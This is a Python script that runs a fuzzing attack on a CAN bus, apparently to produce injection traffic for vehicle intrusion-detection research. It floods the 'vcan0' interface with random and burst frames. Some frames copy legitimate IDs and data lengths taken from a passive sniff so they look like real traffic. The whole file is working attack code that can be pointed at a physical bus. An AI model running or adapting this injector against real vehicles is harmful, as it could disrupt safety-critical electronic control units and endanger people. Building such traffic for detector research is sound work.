import can
import time
import random

bus = can.interface.Bus(channel="vcan0", bustype="socketcan")

FUZZ_INTERVAL_S = 0.0001            # 0.1ms — matches your calibrated fuzz rate
DURATION_S = 1

# Sophistication tier probabilities — matches inject_mixed_sophistication_fuzz fractions
NAIVE_PROB          = 0.45           # foreign id, random dlc
ID_AWARE_PROB       = 0.40           # legitimate id, random dlc
FULLY_MIMICKING_PROB = 0.15          # legitimate id, legitimate dlc for that id

BURST_PROB = 0.35                    # matches FUZZ_BURST_PROB
BURST_MIN, BURST_MAX = 2, 6

ZERO_BYTE_PROB = 0.35                # fraction of bytes forced to 0x00

DLC_VALUES  = [0,1,2,3,4,5,6,7,8]
DLC_WEIGHTS = [1,1,1,2,2,3,3,4,8]

# These must be populated from a passive sniff of real traffic before
# running the attack (mirrors normal_ids / id_mode_dlc learned from the
# dataset in your offline injection function)
LEGITIMATE_IDS = [0x158, 0x161, 0x191, 0x143, ...]     # observed on the bus
ID_MODE_DLC    = {0x158: 8, 0x161: 8, 0x191: 7, ...}    # observed dominant dlc per id

def random_byte(zero_prob=ZERO_BYTE_PROB):
    return 0 if random.random() < zero_prob else random.randint(0, 255)

def random_dlc():
    return random.choices(DLC_VALUES, weights=DLC_WEIGHTS, k=1)[0]

def make_payload(dlc):
    payload = [random_byte() for _ in range(dlc)]
    return payload + [0]*(8-dlc)   # pad remainder with 0x00, DLC-aware

def pick_frame():
    r = random.random()
    if r < NAIVE_PROB:
        aid = random.randint(0x000, 0x7FF)     # foreign id, full range
        dlc = random_dlc()
    elif r < NAIVE_PROB + ID_AWARE_PROB:
        aid = random.choice(LEGITIMATE_IDS)     # legitimate id
        dlc = random_dlc()                      # but dlc still fuzzed
    else:
        aid = random.choice(LEGITIMATE_IDS)     # legitimate id
        dlc = ID_MODE_DLC.get(aid, 8)            # AND legitimate dlc for that id
    return aid, dlc

start = time.time()
print("[+] Starting fuzzing attack")

try:
    while time.time() - start < DURATION_S:
        if random.random() < BURST_PROB:
            burst_len = random.randint(BURST_MIN, BURST_MAX)
            aid, dlc = pick_frame()              # SAME id repeated across the burst
            for _ in range(burst_len):
                if time.time() - start >= DURATION_S:
                    break
                data = make_payload(dlc)          # payload still fresh every frame
                msg = can.Message(arbitration_id=aid, data=data, is_extended_id=False)
                try:
                    bus.send(msg)
                except can.CanError as e:
                    print("Send error:", e)
                time.sleep(FUZZ_INTERVAL_S)
        else:
            aid, dlc = pick_frame()
            data = make_payload(dlc)
            msg = can.Message(arbitration_id=aid, data=data, is_extended_id=False)
            try:
                bus.send(msg)
            except can.CanError as e:
                print("Send error:", e)
            time.sleep(FUZZ_INTERVAL_S)

except KeyboardInterrupt:
    print("\n[!] Stopped safely")

print(f"[+] Fuzzing complete: {time.time()-start:.2f}s elapsed")
